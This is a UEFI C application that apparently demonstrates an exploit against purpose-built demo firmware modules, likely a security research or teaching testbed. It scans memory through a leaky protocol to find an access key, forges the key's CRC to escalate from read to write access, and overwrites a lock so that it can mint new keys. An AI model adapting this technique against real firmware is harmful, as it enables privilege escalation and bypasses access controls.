#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/ShellParameters.h>
#include <Protocol/Shell.h>
#include <Library/ShellLib.h>
#include "../Demo1_Access_Key/Demo1_Access_Key.h"
#include "../Demo1_Bob/Demo1_Bob.h"
#include "../Demo1_Alice/Demo1_Alice.h"

Demo1_Access_Key_PROTOCOL * _Single AccessKeyProtocol;
Demo1_Bob_PROTOCOL *_Single BobProtocol;
#define EXAMPLEAPP_VARNAME   L"ExampleVar"
UINT32  crcTable[256] = {
        0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535,0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD,0xE7B82D07,0x90BF1D91,0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D,0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,0x3B6E20C8,0x4C69105E,0xD56041E4,0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C,0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,0x26D930AC,0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F,0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB,0xB6662D3D,0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB,0x086D3D2D,0x91646C97,0xE6635C01,0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA,0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,0x4DB26158,0x3AB551CE,0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A,0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,0xB7BD5C3B,0xC0BA6CAD,0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739,0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8,0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,0xF00F9344,0x8708A3D2,0x1E01F268,0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0,0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,0xD6D6A3E8,0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF,0x4669BE79,0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703,0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7,0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A,0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE,0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,0x86D3D2D4,0xF1D4E242,0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6,0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45,0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D,0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5,0x47B2CF7F,0x30B5FFE9,0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605,0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94,0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D
};
UINT32 inverseCrcTable[256] = {
        0x00000000,0x01db7106,0x026d930a,0x03b6e20c,0x04db2615,0x05005713,0x06b6b51f,0x076dc419,0x086d3d2d,0x09b64c2b,0x0a00ae27,0x0bdbdf21,0x0cb61b38,0x0d6d6a3e,0x0edb8832,0x0f00f934,0x10da7a5a,0x11010b5c,0x12b7e950,0x136c9856,0x14015c4f,0x15da2d49,0x166ccf45,0x17b7be43,0x18b74777,0x196c3671,0x1adad47d,0x1b01a57b,0x1c6c6162,0x1db71064,0x1e01f268,0x1fda836e,0x206f85b3,0x21b4f4b5,0x220216b9,0x23d967bf,0x24b4a3a6,0x256fd2a0,0x26d930ac,0x270241aa,0x2802b89e,0x29d9c998,0x2a6f2b94,0x2bb45a92,0x2cd99e8b,0x2d02ef8d,0x2eb40d81,0x2f6f7c87,0x30b5ffe9,0x316e8eef,0x32d86ce3,0x33031de5,0x346ed9fc,0x35b5a8fa,0x36034af6,0x37d83bf0,0x38d8c2c4,0x3903b3c2,0x3ab551ce,0x3b6e20c8,0x3c03e4d1,0x3dd895d7,0x3e6e77db,0x3fb506dd,0x40df0b66,0x41047a60,0x42b2986c,0x4369e96a,0x44042d73,0x45df5c75,0x4669be79,0x47b2cf7f,0x48b2364b,0x4969474d,0x4adfa541,0x4b04d447,0x4c69105e,0x4db26158,0x4e048354,0x4fdff252,0x5005713c,0x51de003a,0x5268e236,0x53b39330,0x54de5729,0x5505262f,0x56b3c423,0x5768b525,0x58684c11,0x59b33d17,0x5a05df1b,0x5bdeae1d,0x5cb36a04,0x5d681b02,0x5edef90e,0x5f058808,0x60b08ed5,0x616bffd3,0x62dd1ddf,0x63066cd9,0x646ba8c0,0x65b0d9c6,0x66063bca,0x67dd4acc,0x68ddb3f8,0x6906c2fe,0x6ab020f2,0x6b6b51f4,0x6c0695ed,0x6ddde4eb,0x6e6b06e7,0x6fb077e1,0x706af48f,0x71b18589,0x72076785,0x73dc1683,0x74b1d29a,0x756aa39c,0x76dc4190,0x77073096,0x7807c9a2,0x79dcb8a4,0x7a6a5aa8,0x7bb12bae,0x7cdcefb7,0x7d079eb1,0x7eb17cbd,0x7f6a0dbb,0x806567cb,0x81be16cd,0x8208f4c1,0x83d385c7,0x84be41de,0x856530d8,0x86d3d2d4,0x8708a3d2,0x88085ae6,0x89d32be0,0x8a65c9ec,0x8bbeb8ea,0x8cd37cf3,0x8d080df5,0x8ebeeff9,0x8f659eff,0x90bf1d91,0x91646c97,0x92d28e9b,0x9309ff9d,0x94643b84,0x95bf4a82,0x9609a88e,0x97d2d988,0x98d220bc,0x990951ba,0x9abfb3b6,0x9b64c2b0,0x9c0906a9,0x9dd277af,0x9e6495a3,0x9fbfe4a5,0xa00ae278,0xa1d1937e,0xa2677172,0xa3bc0074,0xa4d1c46d,0xa50ab56b,0xa6bc5767,0xa7672661,0xa867df55,0xa9bcae53,0xaa0a4c5f,0xabd13d59,0xacbcf940,0xad678846,0xaed16a4a,0xaf0a1b4c,0xb0d09822,0xb10be924,0xb2bd0b28,0xb3667a2e,0xb40bbe37,0xb5d0cf31,0xb6662d3d,0xb7bd5c3b,0xb8bda50f,0xb966d409,0xbad03605,0xbb0b4703,0xbc66831a,0xbdbdf21c,0xbe0b1010,0xbfd06116,0xc0ba6cad,0xc1611dab,0xc2d7ffa7,0xc30c8ea1,0xc4614ab8,0xc5ba3bbe,0xc60cd9b2,0xc7d7a8b4,0xc8d75180,0xc90c2086,0xcabac28a,0xcb61b38c,0xcc0c7795,0xcdd70693,0xce61e49f,0xcfba9599,0xd06016f7,0xd1bb67f1,0xd20d85fd,0xd3d6f4fb,0xd4bb30e2,0xd56041e4,0xd6d6a3e8,0xd70dd2ee,0xd80d2bda,0xd9d65adc,0xda60b8d0,0xdbbbc9d6,0xdcd60dcf,0xdd0d7cc9,0xdebb9ec5,0xdf60efc3,0xe0d5e91e,0xe10e9818,0xe2b87a14,0xe3630b12,0xe40ecf0b,0xe5d5be0d,0xe6635c01,0xe7b82d07,0xe8b8d433,0xe963a535,0xead54739,0xeb0e363f,0xec63f226,0xedb88320,0xee0e612c,0xefd5102a,0xf00f9344,0xf1d4e242,0xf262004e,0xf3b97148,0xf4d4b551,0xf50fc457,0xf6b9265b,0xf762575d,0xf862ae69,0xf9b9df6f,0xfa0f3d63,0xfbd44c65,0xfcb9887c,0xfd62f97a,0xfed41b76,0xff0f6a70
};

UINT32
ReverseCRC32(
        IN UINT32 crc
)
{
    UINT32 init = 0xffffffff;
    UINT32 Crc = crc ^ init;
    UINT32 keys[4] = {0};
    UINT32 crc_table_index;
    UINT32 key;
    for (int i = 0; i < 4; i++) {
        crc_table_index = Crc >> 24;
        key = inverseCrcTable[crc_table_index];
        keys[i] = key;
        Crc = (Crc ^ key) << 8;
    }
    char out[5] = {'\0'};
    char char_guess;
    UINT8 crctable_index;
    for (int i = 3; i >= 0; i--) {
        key = keys[i];
        for (int j=0; j<256; j++){
            if (crcTable[j] == key){
                crctable_index = j;
                break;
            }
        }
        char_guess = crctable_index ^ (init % 256);
        init = (init >> 8) ^ key;
        out[3 - i] = char_guess;
    }
    return *(UINT32 *)out;
}
UINTN
ScanMemory(
        IN UINTN startAddress,
        IN UINTN size,
        IN VOID* searchValue
)
{
    /* Locate Access Key Protocol and Bob Protocol*/
    gBS->LocateProtocol(&gDemo1BobProtocolGuid, NULL, (VOID *)&BobProtocol);
    // Known key address for Bob so find get the key stored there
    UINTN searchValueLength = sizeof(searchValue);
    if(searchValueLength > size)
    {
        return 0;
    }
    EFI_STATUS Status = EFI_SUCCESS;
    CHAR16 *Data;
    UINTN *Address = NULL;
    // Loop through all of the address and save the key if the header matches a key header
    for(UINTN addr = startAddress; addr < startAddress + size; addr++)
    {
        Address = (UINTN *)addr;
        UINTN* _Array CheckedAddress _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)) = NULL;
        CheckedAddress = _Assume_bounds_cast_M(VOID* _Array, (UINTN*)addr, _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)));
        Status = BobProtocol->Demo1BobDataProvider(BobProtocol, CheckedAddress, (VOID *_Array *)&Data, searchValueLength);
        if(Status == EFI_SUCCESS)
        {
            if(CompareMem((VOID*)Data, searchValue, searchValueLength) == 0)
            {
                DEMO1_ACCESS_KEY *tmp = (DEMO1_ACCESS_KEY *)Data;
                Print(L"Found Bobs Key: (0x%016llx..%016llx) \r\n", tmp->access_key_store[0], tmp->access_key_store[1]);
                FreePool(Data);
                return addr;
            }
            FreePool(Data);
        }
    }
    return 0;
}

EFI_STATUS
        EFIAPI
Demo1Exploit_Entry (
        IN EFI_HANDLE imgHandle,
        IN EFI_SYSTEM_TABLE* sysTable
)
{
    EFI_STATUS Status;
    EFI_STATUS retval;
    BOOLEAN retbool;
    gBS = sysTable->BootServices;
    gBS->SetWatchdogTimer(0, 0, 0, NULL); // UEFI apps automatically exit after 5 minutes. Stop that here.
    Print(L"Exploit Started\r\n");
    /* Locate Access Key Protocol and Bob Protocol*/
    gBS->LocateProtocol(&gDemo1BobProtocolGuid, NULL, (VOID *)&BobProtocol);
    gBS->LocateProtocol(&gDemo1AccessKeyProtocolGuid, NULL, (VOID *)&AccessKeyProtocol);
    DEMO1_ACCESS_KEY * _Single my_access_key=AllocatePool(sizeof(DEMO1_ACCESS_KEY));
    // Known key address for Bob so find get the key stored there
    UINTN *Address = NULL;
    UINTN Size = sizeof(DEMO1_ACCESS_KEY);
    DEMO1_ACCESS_KEY *Data;
    UINTN searchValue = 0xDEC0DEBABB1E10AD;
    //Loop through all of the address and save the key if the header matches a key header
    for(UINTN addr = 0; addr < MAX_UINTN; addr += Size)
    {
        Address = (UINTN *)addr;
        UINTN* _Array CheckedAddress _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)) = NULL;
        CheckedAddress = _Assume_bounds_cast_M(VOID* _Array, (UINTN*)addr, _Bounds(&DataToProvide, &DataToProvide + sizeof(DataToProvide)));
        Status = BobProtocol->Demo1BobDataProvider(BobProtocol, CheckedAddress, (VOID *_Array *)&Data, Size);
        if(Status == EFI_SUCCESS)
        {
            if(CompareMem((VOID*)&(Data->access_key_store[1]), &searchValue, sizeof(searchValue)) == 0)
            //if(Data->access_key_store[1] == 0xDEC0DEBABB1E10AD)
            {
                Address = (UINTN *)addr;
                Print(L"Found Bobs Key: (0x%016llx..%016llx) \r\n", Data->access_key_store[0], Data->access_key_store[1]);
                Print (L"---->Keys Address: 0x%016llx\n", Address);
                break;
            }
            FreePool(Data);
        }
    }
    UINTN startAddress = (UINTN)Address - 200;
    UINTN size = sizeof(UINTN)*100;
    UINTN *output = (UINTN*) ScanMemory(startAddress, size, (VOID *)&searchValue);
    Print (L"Keys Address: 0x%016llx\n", output);
    UINT32 Header_Value = (UINT32)((ACCESS_KEY_MAGIC << MAGIC_SIZE) + WRITE_ACCESS);
    UINT32 RevOut = ReverseCRC32(Header_Value);
    gBS->CalculateCrc32(&RevOut, 4, (UINT32 *)&(Data->access_key_store[1]));
    Print(L"Modified Key: (0x%016llx..%016llx) \r\n", Data->access_key_store[0], Data->access_key_store[1]);
    // Change key from read to write
    //Data->access_key_store[1] = (ACCESS_KEY_MAGIC << MAGIC_SIZE) + WRITE_ACCESS;
    Print(L"Modified key to have write access");
    // Write to
    UINTN ExampleVar_Value = 0;
    Print(L"Setting Access Variable to - 0x%08llx\r\n", ExampleVar_Value);
    UINTN BufferSize = sizeof(ExampleVar_Value);
    Status  = sysTable->RuntimeServices->SetAccessVariable (
            ALICEMODE_VARNAME,
            &gAliceVariableGuid,
            EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
            Data,
            BufferSize,
            &ExampleVar_Value
    );
    if (EFI_ERROR (Status)) {
        DEBUG ((DEBUG_ERROR, "%a: variable '%s' could not be written - bailing!\n", __FUNCTION__, ALICEMODE_VARNAME));
        return Status;
    }
    Print(L"Set Access Variable Success\r\n");
    /* Generate Access Key */
    Print(L"Call Generate Access Key before changing accessKeyLock\r\n");
    retval = AccessKeyProtocol->Demo1GenerateAccessKey(AccessKeyProtocol, NULL, TRUE, my_access_key);
    if (retval == 0) {
        Print(L"Succescfully created an access key...Failed\r\n");
        return EFI_ABORTED;
    }
    Print(L"Failed to generate access key...Success\r\n");
    //Change accessKeyLock
    Print(L"Attempting to write to accessKeyLock\r\n");
    UINTN *getExampleVar_Value = (UINTN *)((UINTN)Address + 0x6E78);// accessKeyLock
    Print (L"AccessKeyLock Address: 0x%016llx\n", getExampleVar_Value);
    BufferSize = sizeof(getExampleVar_Value);
    Status = gST->RuntimeServices->GetAccessVariable (
            ALICEMODE_VARNAME,
            &gAliceVariableGuid,
            NULL,
            Data,
            &BufferSize,
            getExampleVar_Value
    );
    if (EFI_ERROR (Status)) {
        DEBUG ((DEBUG_ERROR, "%a: variable '%s' could not be read - bailing!\n", __FUNCTION__, EXAMPLEAPP_VARNAME));
        return Status;
    }
    Print(L"Successfully wrote to accessKeyLock - %d\r\n", *getExampleVar_Value);
    /* Generate Access Key */
    Print(L"Generate New Access Key\r\n");
    retval = AccessKeyProtocol->Demo1GenerateAccessKey(AccessKeyProtocol, NULL, TRUE, my_access_key);
    if (retval != 0) {
        Print(L"Failed to generate access key\r\n");
        return EFI_ABORTED;
    }
    Print(L"Successfully generated a new access key: (0x%016llx..%016llx) \r\n",
    my_access_key->access_key_store[0], my_access_key->access_key_store[1]);
    /* Validate Access Key */
    Print(L"Validate Access Key \r\n");
    AccessKeyProtocol->Demo1ValidateAccessKey(AccessKeyProtocol, NULL, my_access_key, TRUE, &retbool);
    if (retbool == FALSE) {
        Print(L"Could not validate key\r\n");
        return EFI_ABORTED;
    }
    Print(L"Key is valid\r\n");
    Print(L"Exploit finished\r\n");
    return EFI_SUCCESS;
}